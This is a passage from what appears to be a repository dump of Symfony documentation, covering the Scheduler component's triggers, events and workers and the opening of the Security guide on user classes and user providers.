week)\n``#monthly``            ``# # # * *`` (at some time on some day, once per month)\n``#monthly@midnight``   ``# #(0-2) # * *`` (at ``#midnight`` on some day, once per month)\n``#annually``           ``# # # # *`` (at some time on some day, once per year)\n``#annually@midnight``  ``# #(0-2) # # *``  (at ``#midnight`` on some day, once per year)\n``#yearly``             ``# # # # *`` alias for ``#annually``\n``#yearly@midnight``    ``# #(0-2) # # *`` alias for ``#annually@midnight``\n``#midnight``           ``# #(0-2) * * *`` (at some time between midnight and 2:59am, every day)\n======================  ========================================================================\n\nFor example::\n\n    RecurringMessage::cron('#midnight', new Message());\n\n.. note::\n\n    The day of month range is ``1-28``, this is to account for February\n    which has a minimum of 28 days.\n\nPeriodical Triggers\n~~~~~~~~~~~~~~~~~~~\n\nThese triggers allows to configure the frequency using different data types\n(``string``, ``integer``, ``DateInterval``). They also support the `relative formats`_\ndefined by PHP datetime functions::\n\n    RecurringMessage::every('10 seconds', new Message());\n    RecurringMessage::every('3 weeks', new Message());\n    RecurringMessage::every('first Monday of next month', new Message());\n\n    $from = new \\DateTimeImmutable('13:47', new \\DateTimeZone('Europe/Paris'));\n    $until = '2023-06-12';\n    RecurringMessage::every('first Monday of next month', new Message(), $from, $until);\n\n.. tip::\n\n    You can also define periodic tasks using :ref:`the AsPeriodicTask attribute <scheduler-attributes-periodic-task>`.\n\nCustom Triggers\n~~~~~~~~~~~~~~~\n\nCustom triggers allow to configure any frequency dynamically. They are created\nas services that implement :class:`Symfony\\\\Component\\\\Scheduler\\\\Trigger\\\\TriggerInterface`.\n\nFor example, if you want to send customer reports daily except for holiday periods::\n\n    // src/Scheduler/Trigger/NewUserWelcomeEmailHandler.php\n    namespace App\\Scheduler\\Trigger;\n\n    class ExcludeHolidaysTrigger implements TriggerInterface\n    {\n        public function __construct(private TriggerInterface $inner)\n        {\n        }\n\n        // use this method to give a nice displayable name to\n        // identify your trigger (it eases debugging)\n        public function __toString(): string\n        {\n            return $this->inner.' (except holidays)';\n        }\n\n        public function getNextRunDate(\\DateTimeImmutable $run): ?\\DateTimeImmutable\n        {\n            if (!$nextRun = $this->inner->getNextRunDate($run)) {\n                return null;\n            }\n\n            // loop until you get the next run date that is not a holiday\n            while ($this->isHoliday($nextRun)) {\n                $nextRun = $this->inner->getNextRunDate($nextRun);\n            }\n\n            return $nextRun;\n        }\n\n        private function isHoliday(\\DateTimeImmutable $timestamp): bool\n        {\n            // add some logic to determine if the given $timestamp is a holiday\n            // return true if holiday, false otherwise\n        }\n    }\n\nThen, define your recurring message::\n\n    RecurringMessage::trigger(\n        new ExcludeHolidaysTrigger(\n            CronExpressionTrigger::fromSpec('@daily'),\n        ),\n        new SendDailySalesReports('...'),\n    );\n\nFinally, the recurring messages has to be attached to a schedule::\n\n    // src/Scheduler/SaleTaskProvider.php\n    namespace App\\Scheduler;\n\n    #[AsSchedule('uptoyou')]\n    class SaleTaskProvider implements ScheduleProviderInterface\n    {\n        public function getSchedule(): Schedule\n        {\n            return $this->schedule ??= (new Schedule())\n                ->with(\n                    RecurringMessage::trigger(\n                        new ExcludeHolidaysTrigger(\n                            CronExpressionTrigger::fromSpec('@daily'),\n                        ),\n                        new SendDailySalesReports()\n                    ),\n                    RecurringMessage::cron('3 8 * * 1', new CleanUpOldSalesReport())\n                );\n        }\n    }\n\nSo, this ``RecurringMessage`` will encompass both the trigger, defining the\ngeneration frequency of the message, and the message itself, the one to be\nprocessed by a specific handler.\n\nBut what is interesting to know is that it also provides you with the ability to\ngenerate your message(s) dynamically.\n\nA Dynamic Vision for the Messages Generated\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nThis proves particularly useful when the message depends on data stored in\ndatabases or third-party services.\n\nFollowing the previous example of reports generation: they depend on customer requests.\nDepending on the specific demands, any number of reports may need to be generated\nat a defined frequency. For these dynamic scenarios, it gives you the capability\nto dynamically define our message(s) instead of statically. This is achieved by\ndefining a :class:`Symfony\\\\Component\\\\Scheduler\\\\Trigger\\\\CallbackMessageProvider`.\n\nEssentially, this means you can dynamically, at runtime, define your message(s)\nthrough a callback that gets executed each time the scheduler transport\nchecks for messages to be generated::\n\n    // src/Scheduler/SaleTaskProvider.php\n    namespace App\\Scheduler;\n\n    #[AsSchedule('uptoyou')]\n    class SaleTaskProvider implements ScheduleProviderInterface\n    {\n        public function getSchedule(): Schedule\n        {\n            return $this->schedule ??= (new Schedule())\n                ->with(\n                    RecurringMessage::trigger(\n                        new ExcludeHolidaysTrigger(\n                            CronExpressionTrigger::fromSpec('@daily'),\n                        ),\n                        // instead of being static as in the previous example\n                        new CallbackMessageProvider([$this, 'generateReports'], 'foo')\n                    ),\n                    RecurringMessage::cron('3 8 * * 1', new CleanUpOldSalesReport())\n                );\n        }\n\n        public function generateReports(MessageContext $context)\n        {\n            // ...\n            yield new SendDailySalesReports();\n            yield new ReportSomethingReportSomethingElse();\n        }\n    }\n\nExploring Alternatives for Crafting your Recurring Messages\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nThere is also another way to build a ``RecurringMessage``, and this can be done\nby adding one of these attributes to a service or a command:\n:class:`Symfony\\\\Component\\\\Scheduler\\\\Attribute\\\\AsPeriodicTask` and\n:class:`Symfony\\\\Component\\\\Scheduler\\\\Attribute\\\\AsCronTask`.\n\nFor both of these attributes, you have the ability to define the schedule to\nuse via the ``schedule``option. By default, the ``default`` named schedule will\nbe used. Also, by default, the ``__invoke`` method of your service will be called\nbut, it's also possible to specify the method to call via the ``method``option\nand you can define arguments via ``arguments``option if necessary.\n\n.. _scheduler-attributes-cron-task:\n\n``AsCronTask`` Example\n......................\n\nThis is the most basic way to define a cron trigger with this attribute::\n\n    // src/Scheduler/Task/SendDailySalesReports.php\n    namespace App\\Scheduler\\Task;\n\n    use Symfony\\Component\\Scheduler\\Attribute\\AsCronTask;\n\n    #[AsCronTask('0 0 * * *')]\n    class SendDailySalesReports\n    {\n        public function __invoke()\n        {\n            // ...\n        }\n    }\n\nThe attribute takes more parameters to customize the trigger::\n\n    // adds randomly up to 6 seconds to the trigger time to avoid load spikes\n    #[AsCronTask('0 0 * * *', jitter: 6)]\n\n    // defines the method name to call instead as well as the arguments to pass to it\n    #[AsCronTask('0 0 * * *', method: 'sendEmail', arguments: ['email' => 'admin@example.com'])]\n\n    // defines the timezone to use\n    #[AsCronTask('0 0 * * *', timezone: 'Africa/Malabo')]\n\n.. _scheduler-attributes-periodic-task:\n\n``AsPeriodicTask`` Example\n..........................\n\nThis is the most basic way to define a periodic trigger with this attribute::\n\n    // src/Scheduler/Task/SendDailySalesReports.php\n    namespace App\\Scheduler\\Task;\n\n    use Symfony\\Component\\Scheduler\\Attribute\\AsPeriodicTask;\n\n    #[AsPeriodicTask(frequency: '1 day', from: '2022-01-01', until: '2023-06-12')]\n    class SendDailySalesReports\n    {\n        public function __invoke()\n        {\n            // ...\n        }\n    }\n\n.. note::\n\n    The ``from`` and ``until`` options are optional. If not defined, the task\n    will be executed indefinitely.\n\nThe ``#[AsPeriodicTask]`` attribute takes many parameters to customize the trigger::\n\n    // the frequency can be defined as an integer representing the number of seconds\n    #[AsPeriodicTask(frequency: 86400)]\n\n    // adds randomly up to 6 seconds to the trigger time to avoid load spikes\n    #[AsPeriodicTask(frequency: '1 day', jitter: 6)]\n\n    // defines the method name to call instead as well as the arguments to pass to it\n    #[AsPeriodicTask(frequency: '1 day', method: 'sendEmail', arguments: ['email' => 'admin@symfony.com'])]\n    class SendDailySalesReports\n    {\n        public function sendEmail(string $email): void\n        {\n            // ...\n        }\n    }\n\nManaging Scheduled Messages\n---------------------------\n\nModifying Scheduled Messages in Real-Time\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nWhile planning a schedule in advance is beneficial, it is rare for a schedule to\nremain static over time. After a certain period, some ``RecurringMessages`` may\nbecome obsolete, while others may need to be integrated into the planning.\n\nAs a general practice, to alleviate a heavy workload, the recurring messages in\nthe schedules are stored in memory to avoid recalculation each time the scheduler\ntransport generates messages. However, this approach can have a flip side.\n\nFollowing the same report generation example as above, the company might do some\npromotions during specific periods (and they need to be communicated repetitively\nthroughout a given timeframe) or the deletion of old reports needs to be halted\nunder certain circumstances.\n\nThis is why the ``Scheduler`` incorporates a mechanism to dynamically modify the\nschedule and consider all changes in real-time.\n\nStrategies for Adding, Removing, and Modifying Entries within the Schedule\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nThe schedule provides you with the ability to :method:`Symfony\\\\Component\\\\Scheduler\\Schedule::add`,\n:method:`Symfony\\\\Component\\\\Scheduler\\Schedule::remove`, or :method:`Symfony\\\\Component\\\\Scheduler\\Schedule::clear`\nall associated recurring messages, resulting in the reset and recalculation of\nthe in-memory stack of recurring messages.\n\nFor instance, for various reasons, if there's no need to generate a report, a\ncallback can be employed to conditionally skip generating of some or all reports.\n\nHowever, if the intention is to completely remove a recurring message and its recurrence,\nthe :class:`Symfony\\\\Component\\\\Scheduler\\Schedule` offers a :method:`Symfony\\\\Component\\\\Scheduler\\Schedule::remove`\nor a :method:`Symfony\\\\Component\\\\Scheduler\\Schedule::removeById` method. This can\nbe particularly useful in your case, especially if you need to halt the generation\nof the recurring message, which involves deleting old reports.\n\nIn your handler, you can check a condition and, if affirmative, access the\n:class:`Symfony\\\\Component\\\\Scheduler\\Schedule` and invoke this method::\n\n    // src/Scheduler/SaleTaskProvider.php\n    namespace App\\Scheduler;\n\n    #[AsSchedule('uptoyou')]\n    class SaleTaskProvider implements ScheduleProviderInterface\n    {\n        public function getSchedule(): Schedule\n        {\n            $this->removeOldReports = RecurringMessage::cron(‘3 8 * * 1’, new CleanUpOldSalesReport());\n\n            return $this->schedule ??= (new Schedule())\n                ->with(\n                    // ...\n                    $this->removeOldReports;\n                );\n        }\n\n        // ...\n\n        public function removeCleanUpMessage()\n        {\n            $this->getSchedule()->getSchedule()->remove($this->removeOldReports);\n        }\n    }\n\n    // src/Scheduler/Handler/CleanUpOldSalesReportHandler.php\n    namespace App\\Scheduler\\Handler;\n\n    #[AsMessageHandler]\n    class CleanUpOldSalesReportHandler\n    {\n        public function __invoke(CleanUpOldSalesReport $cleanUpOldSalesReport): void\n        {\n            // do some work here...\n\n            if ($isFinished) {\n                $this->mySchedule->removeCleanUpMessage();\n            }\n        }\n    }\n\nNevertheless, this system may not be the most suitable for all scenarios. Also,\nthe handler should ideally be designed to process the type of message it is\nintended for, without making decisions about adding or removing a new recurring\nmessage.\n\nFor instance, if, due to an external event, there is a need to add a recurrent\nmessage aimed at deleting reports, it can be challenging to achieve within the\nhandler. This is because the handler will no longer be called or executed once\nthere are no more messages of that type.\n\nHowever, the Scheduler also features an event system that is integrated into a\nSymfony full-stack application by grafting onto Symfony Messenger events. These\nevents are dispatched through a listener, providing a convenient means to respond.\n\nManaging Scheduled Messages via Events\n--------------------------------------\n\nA Strategic Event Handling\n~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nThe goal is to provide flexibility in deciding when to take action while\npreserving decoupling. Three primary event types have been introduced types\n\n* ``PRE_RUN_EVENT``\n* ``POST_RUN_EVENT``\n* ``FAILURE_EVENT``\n\nAccess to the schedule is a crucial feature, allowing effortless addition or\nremoval of message types. Additionally, it will be possible to access the\ncurrently processed message and its message context.\n\nIn consideration of our scenario, you can listen to the ``PRE_RUN_EVENT`` and\ncheck if a certain condition is met. For instance, you might decide to add a\nrecurring message for cleaning old reports again, with the same or different\nconfigurations, or add any other recurring message(s).\n\nIf you had chosen to handle the deletion of the recurring message, you could\nhave done so in a listener for this event. Importantly, it reveals a specific\nfeature :method:`Symfony\\\\Component\\\\Scheduler\\\\Event\\\\PreRunEvent::shouldCancel`\nthat allows you to prevent the message of the deleted recurring message from\nbeing transferred and processed by its handler::\n\n    // src/Scheduler/SaleTaskProvider.php\n    namespace App\\Scheduler;\n\n    #[AsSchedule('uptoyou')]\n    class SaleTaskProvider implements ScheduleProviderInterface\n    {\n        public function __construct(private EventDispatcherInterface $dispatcher)\n        {\n        }\n\n        public function getSchedule(): Schedule\n        {\n            $this->removeOldReports = RecurringMessage::cron('3 8 * * 1', new CleanUpOldSalesReport());\n\n            return $this->schedule ??= (new Schedule($this->dispatcher))\n                ->with(\n                    // ...\n                )\n                ->before(function(PreRunEvent $event) {\n                    $message = $event->getMessage();\n                    $messageContext = $event->getMessageContext();\n\n                    // can access the schedule\n                    $schedule = $event->getSchedule()->getSchedule();\n\n                    // can target directly the RecurringMessage being processed\n                    $schedule->removeById($messageContext->id);\n\n                    // allow to call the ShouldCancel() and avoid the message to be handled\n                    $event->shouldCancel(true);\n                })\n                ->after(function(PostRunEvent $event) {\n                    // Do what you want\n                })\n                ->onFailure(function(FailureEvent $event) {\n                    // Do what you want\n                });\n        }\n    }\n\nScheduler Events\n~~~~~~~~~~~~~~~~\n\nPreRunEvent\n...........\n\n**Event Class**: :class:`Symfony\\\\Component\\\\Scheduler\\\\Event\\\\PreRunEvent`\n\n``PreRunEvent`` allows to modify the :class:`Symfony\\\\Component\\\\Scheduler\\\\Schedule`\nor cancel a message before it's consumed::\n\n    use Symfony\\Component\\EventDispatcher\\EventSubscriberInterface;\n    use Symfony\\Component\\Scheduler\\Event\\PreRunEvent;\n\n    public function onMessage(PreRunEvent $event): void\n    {\n        $schedule = $event->getSchedule();\n        $context = $event->getMessageContext();\n        $message = $event->getMessage();\n\n        // do something with the schedule, context or message\n\n        // and/or cancel message\n        $event->shouldCancel(true);\n    }\n\nExecute this command to find out which listeners are registered for this event\nand their priorities:\n\n.. code-block:: terminal\n\n    $ php bin/console debug:event-dispatcher \"Symfony\\Component\\Scheduler\\Event\\PreRunEvent\"\n\nPostRunEvent\n............\n\n**Event Class**: :class:`Symfony\\\\Component\\\\Scheduler\\\\Event\\\\PostRunEvent`\n\n``PostRunEvent`` allows to modify the :class:`Symfony\\\\Component\\\\Scheduler\\\\Schedule`\nafter a message is consumed::\n\n    use Symfony\\Component\\EventDispatcher\\EventSubscriberInterface;\n    use Symfony\\Component\\Scheduler\\Event\\PostRunEvent;\n\n    public function onMessage(PostRunEvent $event): void\n    {\n        $schedule = $event->getSchedule();\n        $context = $event->getMessageContext();\n        $message = $event->getMessage();\n\n        // do something with the schedule, context or message\n    }\n\nExecute this command to find out which listeners are registered for this event\nand their priorities:\n\n.. code-block:: terminal\n\n    $ php bin/console debug:event-dispatcher \"Symfony\\Component\\Scheduler\\Event\\PostRunEvent\"\n\nFailureEvent\n............\n\n**Event Class**: :class:`Symfony\\\\Component\\\\Scheduler\\\\Event\\\\FailureEvent`\n\n``FailureEvent`` allows to modify the :class:`Symfony\\\\Component\\\\Scheduler\\\\Schedule`\nwhen a message consumption throws an exception::\n\n    use Symfony\\Component\\EventDispatcher\\EventSubscriberInterface;\n    use Symfony\\Component\\Scheduler\\Event\\FailureEvent;\n\n    public function onMessage(FailureEvent $event): void\n    {\n        $schedule = $event->getSchedule();\n        $context = $event->getMessageContext();\n        $message = $event->getMessage();\n\n        $error = $event->getError();\n\n        // do something with the schedule, context, message or error (logging, ...)\n\n        // and/or ignore failure event\n        $event->shouldIgnore(true);\n    }\n\nExecute this command to find out which listeners are registered for this event\nand their priorities:\n\n.. code-block:: terminal\n\n    $ php bin/console debug:event-dispatcher \"Symfony\\Component\\Scheduler\\Event\\FailureEvent\"\n\n.. _consuming-messages-running-the-worker:\n\nConsuming Messages\n------------------\n\nThe Scheduler component offers two ways to consume messages, depending on your\nneeds: using the ``messenger:consume`` command or creating a worker programmatically.\nThe first solution is the recommended one when using the Scheduler component in\nthe context of a full stack Symfony application, the second one is more suitable\nwhen using the Scheduler component as a standalone component.\n\nRunning a Worker\n~~~~~~~~~~~~~~~~\n\nAfter defining and attaching your recurring messages to a schedule, you'll need\na mechanism to generate and consume the messages according to their defined frequencies.\nTo do that, the Scheduler component uses the ``messenger:consume`` command from\nthe Messenger component:\n\n.. code-block:: terminal\n\n    $ php bin/console messenger:consume scheduler_nameofyourschedule\n\n    # use -vv if you need details about what's happening\n    $ php bin/console messenger:consume scheduler_nameofyourschedule -vv\n\n.. image:: /_images/components/scheduler/generate_consume.png\n    :alt: Symfony Scheduler - generate and consume\n\n.. tip::\n\n    Depending on your deployment scenario, you may prefer automating the execution of\n    the Messenger worker process using tools like cron, Supervisor, or systemd.\n    This ensures workers are running continuously. For more details, refer to the\n    `Deploying to Production`_ section of the Messenger component documentation.\n\nCreating a Consumer Programmatically\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nAn alternative to the previous solution is to create and call a worker that\nwill consume the messages. The component comes with a ready-to-use worker\nnamed :class:`Symfony\\\\Component\\\\Scheduler\\\\Scheduler` that you can use in your\ncode::\n\n    use Symfony\\Component\\Scheduler\\Scheduler;\n\n    $schedule = (new Schedule())\n        ->with(\n            RecurringMessage::trigger(\n                new ExcludeHolidaysTrigger(\n                    CronExpressionTrigger::fromSpec('@daily'),\n                ),\n                new SendDailySalesReports()\n            ),\n        );\n\n    $scheduler = new Scheduler(handlers: [\n        SendDailySalesReports::class => new SendDailySalesReportsHandler(),\n        // add more handlers if you have more message types\n    ], schedules: [\n        $schedule,\n        // the scheduler can take as many schedules as you need\n    ]);\n\n    // finally, run the scheduler once it's ready\n    $scheduler->run();\n\n.. note::\n\n    The :class:`Symfony\\\\Component\\\\Scheduler\\\\Scheduler` may be used\n    when using the Scheduler component as a standalone component. If\n    you are using it in the framework context, it is highly recommended to\n    use the ``messenger:consume`` command as explained in the previous\n    section.\n\nDebugging the Schedule\n----------------------\n\nThe ``debug:scheduler`` command provides a list of schedules along with their\nrecurring messages. You can narrow down the list to a specific schedule:\n\n.. code-block:: terminal\n\n    $ php bin/console debug:scheduler\n\n      Scheduler\n      =========\n\n      default\n      -------\n\n        ------------------- ------------------------- ----------------------\n        Trigger             Provider                  Next Run\n        ------------------- ------------------------- ----------------------\n        every 2 days        App\\Messenger\\Foo(0:17..)  Sun, 03 Dec 2023 ...\n        15 4 */3 * *        App\\Messenger\\Foo(0:17..)  Mon, 18 Dec 2023 ...\n       -------------------- -------------------------- ---------------------\n\n    # you can also specify a date to use for the next run date:\n    $ php bin/console debug:scheduler --date=2025-10-18\n\n    # you can also specify a date to use for the next run date for a schedule:\n    $ php bin/console debug:scheduler name_of_schedule --date=2025-10-18\n\n    # use the --all option to also display the terminated recurring messages\n    $ php bin/console debug:scheduler --all\n\nEfficient management with Symfony Scheduler\n-------------------------------------------\n\nWhen a worker is restarted or undergoes shutdown for a period, the Scheduler transport won't be able to generate the messages (because they are created on-the-fly by the scheduler transport).\nThis implies that any messages scheduled to be sent during the worker's inactive period are not sent, and the Scheduler will lose track of the last processed message.\nUpon restart, it will recalculate the messages to be generated from that point onward.\n\nTo illustrate, consider a recurring message set to be sent every 3 days.\nIf a worker is restarted on day 2, the message will be sent 3 days from the restart, on day 5.\n\nWhile this behavior may not necessarily pose a problem, there is a possibility that it may not align with what you are seeking.\n\nThat's why the scheduler allows to remember the last execution date of a message\nvia the ``stateful`` option (and the :doc:`Cache component </components/cache>`).\nThis allows the system to retain the state of the schedule, ensuring that when a worker is restarted, it resumes from the point it left off.::\n\n    // src/Scheduler/SaleTaskProvider.php\n    namespace App\\Scheduler;\n\n    #[AsSchedule('uptoyou')]\n    class SaleTaskProvider implements ScheduleProviderInterface\n    {\n        public function getSchedule(): Schedule\n        {\n            $this->removeOldReports = RecurringMessage::cron('3 8 * * 1', new CleanUpOldSalesReport());\n\n            return $this->schedule ??= (new Schedule())\n                ->with(\n                    // ...\n                )\n                ->stateful($this->cache)\n        }\n    }\n\nTo scale your schedules more effectively, you can use multiple workers. In such\ncases, a good practice is to add a :doc:`lock </components/lock>` to prevent the\nsame task more than once::\n\n    // src/Scheduler/SaleTaskProvider.php\n    namespace App\\Scheduler;\n\n    #[AsSchedule('uptoyou')]\n    class SaleTaskProvider implements ScheduleProviderInterface\n    {\n        public function getSchedule(): Schedule\n        {\n            $this->removeOldReports = RecurringMessage::cron('3 8 * * 1', new CleanUpOldSalesReport());\n\n            return $this->schedule ??= (new Schedule())\n                ->with(\n                    // ...\n                )\n                ->lock($this->lockFactory->createLock('my-lock'));\n        }\n    }\n\n.. tip::\n\n    The processing time of a message matters. If it takes a long time, all subsequent\n    message processing may be delayed. So, it's a good practice to anticipate this\n    and plan for frequencies greater than the processing time of a message.\n\nAdditionally, for better scaling of your schedules, you have the option to wrap\nyour message in a :class:`Symfony\\\\Component\\\\Messenger\\\\Message\\\\RedispatchMessage`.\nThis allows you to specify a transport on which your message will be redispatched\nbefore being further redispatched to its corresponding handler::\n\n    // src/Scheduler/SaleTaskProvider.php\n    namespace App\\Scheduler;\n\n    #[AsSchedule('uptoyou')]\n    class SaleTaskProvider implements ScheduleProviderInterface\n    {\n        public function getSchedule(): Schedule\n        {\n            return $this->schedule ??= (new Schedule())\n                ->with(\n                    RecurringMessage::every('5 seconds', new RedispatchMessage(new Message(), 'async'))\n                );\n        }\n    }\n\nWhen using the ``RedispatchMessage``, Symfony will attach a\n:class:`Symfony\\\\Component\\\\Scheduler\\\\Messenger\\\\ScheduledStamp` to the message,\nhelping you identify those messages when needed.\n\n.. _`MakerBundle`: https://symfony.com/doc/current/bundles/SymfonyMakerBundle/index.html\n.. _`Deploying to Production`: https://symfony.com/doc/current/messenger.html#deploying-to-production\n.. _`Memoizing`: https://en.wikipedia.org/wiki/Memoization\n.. _`cron command-line utility`: https://en.wikipedia.org/wiki/Cron\n.. _`crontab.guru website`: https://crontab.guru/\n.. _`relative formats`: https://www.php.net/manual/en/datetime.formats.php#datetime.formats.relative\n"
        },
        {
          "name": "security.rst",
          "type": "blob",
          "size": 102.16015625,
          "content": "Security\n========\n\nSymfony provides many tools to secure your application. Some HTTP-related\nsecurity tools, like :doc:`secure session cookies </session>` and\n:doc:`CSRF protection </security/csrf>` are provided by default. The\nSecurityBundle, which you will learn about in this guide, provides all\nauthentication and authorization features needed to secure your\napplication.\n\n.. _security-installation:\n\nTo get started, install the SecurityBundle:\n\n.. code-block:: terminal\n\n    $ composer require symfony/security-bundle\n\nIf you have :ref:`Symfony Flex <symfony-flex>` installed, this also\ncreates a ``security.yaml`` configuration file for you:\n\n.. code-block:: yaml\n\n    # config/packages/security.yaml\n    security:\n        # https://symfony.com/doc/current/security.html#registering-the-user-hashing-passwords\n        password_hashers:\n            Symfony\\Component\\Security\\Core\\User\\PasswordAuthenticatedUserInterface: 'auto'\n        # https://symfony.com/doc/current/security.html#where-do-users-come-from-user-providers\n        providers:\n            users_in_memory: { memory: null }\n        firewalls:\n            dev:\n                pattern: ^/(_(profiler|wdt)|css|images|js)/\n                security: false\n            main:\n                lazy: true\n                provider: users_in_memory\n\n                # activate different ways to authenticate\n                # https://symfony.com/doc/current/security.html#firewalls-authentication\n\n                # https://symfony.com/doc/current/security/impersonating_user.html\n                # switch_user: true\n\n        # Easy way to control access for large sections of your site\n        # Note: Only the *first* access control that matches will be used\n        access_control:\n            # - { path: ^/admin, roles: ROLE_ADMIN }\n            # - { path: ^/profile, roles: ROLE_USER }\n\nThat's a lot of config! In the next sections, the three main elements are\ndiscussed:\n\n`The User`_ (``providers``)\n    Any secured section of your application needs some concept of\n    a user. The user provider loads users from any storage (e.g. the\n    database) based on a \"user identifier\" (e.g. the user's email address);\n\n`The Firewall`_ & `Authenticating Users`_ (``firewalls``)\n    The firewall is the core of securing your application. Every request\n    within the firewall is checked if it needs an authenticated user. The\n    firewall also takes care of authenticating this user (e.g. using a\n    login form);\n\n`Access Control (Authorization)`_ (``access_control``)\n    Using access control and the authorization checker, you control the\n    required permissions to perform a specific action or visit a specific\n    URL.\n\n.. _create-user-class:\n.. _a-create-your-user-class:\n\nThe User\n--------\n\nPermissions in Symfony are always linked to a user object. If you need to\nsecure (parts of) your application, you need to create a user class. This\nis a class that implements :class:`Symfony\\\\Component\\\\Security\\\\Core\\\\User\\\\UserInterface`.\nThis is often a Doctrine entity, but you can also use a dedicated\nSecurity user class.\n\nThe easiest way to generate a user class is using the ``make:user`` command\nfrom the `MakerBundle`_:\n\n.. code-block:: terminal\n\n    $ php bin/console make:user\n     The name of the security user class (e.g. User) [User]:\n     > User\n\n     Do you want to store user data in the database (via Doctrine)? (yes/no) [yes]:\n     > yes\n\n     Enter a property name that will be the unique \"display\" name for the user (e.g. email, username, uuid) [email]:\n     > email\n\n     Will this app need to hash/check user passwords? Choose No if passwords are not needed or will be checked/hashed by some other system (e.g. a single sign-on server).\n\n     Does this app need to hash/check user passwords? (yes/no) [yes]:\n     > yes\n\n     created: src/Entity/User.php\n     created: src/Repository/UserRepository.php\n     updated: src/Entity/User.php\n     updated: config/packages/security.yaml\n\n.. code-block:: php\n\n    // src/Entity/User.php\n    namespace App\\Entity;\n\n    use App\\Repository\\UserRepository;\n    use Doctrine\\ORM\\Mapping as ORM;\n    use Symfony\\Component\\Security\\Core\\User\\PasswordAuthenticatedUserInterface;\n    use Symfony\\Component\\Security\\Core\\User\\UserInterface;\n\n    #[ORM\\Entity(repositoryClass: UserRepository::class)]\n    class User implements UserInterface, PasswordAuthenticatedUserInterface\n    {\n        #[ORM\\Id]\n        #[ORM\\GeneratedValue]\n        #[ORM\\Column(type: 'integer')]\n        private int $id;\n\n        #[ORM\\Column(type: 'string', length: 180, unique: true)]\n        private ?string $email;\n\n        #[ORM\\Column(type: 'json')]\n        private array $roles = [];\n\n        #[ORM\\Column(type: 'string')]\n        private string $password;\n\n        public function getId(): ?int\n        {\n            return $this->id;\n        }\n\n        public function getEmail(): ?string\n        {\n            return $this->email;\n        }\n\n        public function setEmail(string $email): self\n        {\n            $this->email = $email;\n\n            return $this;\n        }\n\n        /**\n         * The public representation of the user (e.g. a username, an email address, etc.)\n         *\n         * @see UserInterface\n         */\n        public function getUserIdentifier(): string\n        {\n            return (string) $this->email;\n        }\n\n        /**\n         * @see UserInterface\n         */\n        public function getRoles(): array\n        {\n            $roles = $this->roles;\n            // guarantee every user at least has ROLE_USER\n            $roles[] = 'ROLE_USER';\n\n            return array_unique($roles);\n        }\n\n        public function setRoles(array $roles): self\n        {\n            $this->roles = $roles;\n\n            return $this;\n        }\n\n        /**\n         * @see PasswordAuthenticatedUserInterface\n         */\n        public function getPassword(): string\n        {\n            return $this->password;\n        }\n\n        public function setPassword(string $password): self\n        {\n            $this->password = $password;\n\n            return $this;\n        }\n\n        /**\n         * @see UserInterface\n         */\n        public function eraseCredentials(): void\n        {\n            // If you store any temporary, sensitive data on the user, clear it here\n            // $this->plainPassword = null;\n        }\n    }\n\n.. tip::\n\n    Starting in `MakerBundle`_: v1.57.0 - You can pass either ``--with-uuid`` or\n    ``--with-ulid`` to ``make:user``. Leveraging Symfony's :doc:`Uid Component </components/uid>`,\n    this generates a ``User`` entity with the ``id`` type as :ref:`Uuid <uuid>`\n    or :ref:`Ulid <ulid>` instead of ``int``.\n\nIf your user is a Doctrine entity, like in the example above, don't forget\nto create the tables by :ref:`creating and running a migration <doctrine-creating-the-database-tables-schema>`:\n\n.. code-block:: terminal\n\n    $ php bin/console make:migration\n    $ php bin/console doctrine:migrations:migrate\n\n.. tip::\n\n    Starting in `MakerBundle`_: v1.56.0 - Passing ``--formatted`` to ``make:migration``\n    generates a nice and tidy migration file.\n\n.. _where-do-users-come-from-user-providers:\n.. _security-user-providers:\n\nLoading the User: The User Provider\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nBesides creating the entity, the ``make:user`` command also adds config\nfor a user provider in your security configuration:\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/packages/security.yaml\n        security:\n            # ...\n\n            providers:\n                app_user_provider:\n                    entity:\n                        class: App\\Entity\\User\n                        property: email\n\n    .. code-block:: xml\n\n        <!-- config/packages/security.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <srv:container xmlns=\"http://symfony.com/schema/dic/security\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xmlns:srv=\"http://symfony.com/schema/dic/services\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\n                http://symfony.com/schema/dic/security\n                https://symfony.com/schema/dic/security/security-1.0.xsd\">\n\n            <config>\n                <!-- ... -->\n\n                <provider name=\"app_user_provider\">\n                    <entity class=\"App\\Entity\\User\" property=\"email\"/>\n                </provider>\n            </config>\n        </srv:container>\n\n    .. code-block:: php\n\n        // config/packages/security.php\n        use App\\Entity\\User;\n        use Symfony\\Config\\SecurityConfig;\n\n        return static function (SecurityConfig $security): void {\n            // ...\n\n            $security->provider('app_user_provider')\n                ->entity()\n                    ->class(User::class)\n                    ->property('email')\n            ;\n        };\n\nThis user provider knows how to (re)load users from a storage (e.g. a database)\nbased on a \"user identifier\" (e.g. the user's email address or username).\nThe configuration above uses Doctrine to load the ``User`` entity using the\n``email`` property as \"user identifier\".\n\nUser providers are used in a couple places during the security lifecycle:\n\n**Load the User based on an identifier**\n    During login (or any other authenticator), the provider loads the user\n    based on the user identifier. Some other features, like\n    :doc:`user impersonation </security/impersonating_user>` and\n    :doc:`Remember Me </security/remember_me>` also use this.\n\n**Reload the User from the session**\n    At the beginning of each request, the user is loaded from the\n    session (unless your firewall is ``stateless``). The provider\n    \"refreshes\" the user (e.g. the database is queried again for fresh\n    data) to make sure all user information is up to date (and if\n    necessary, the user is de-authenticated/logged out if something\n    changed). See :ref:`user_session_refresh` for more information about\n    this process.\n\nSymfony comes with several built-in user providers:\n\n:ref:`Entity User Provider <security-entity-user-provider>`\n    Loads users from a database using 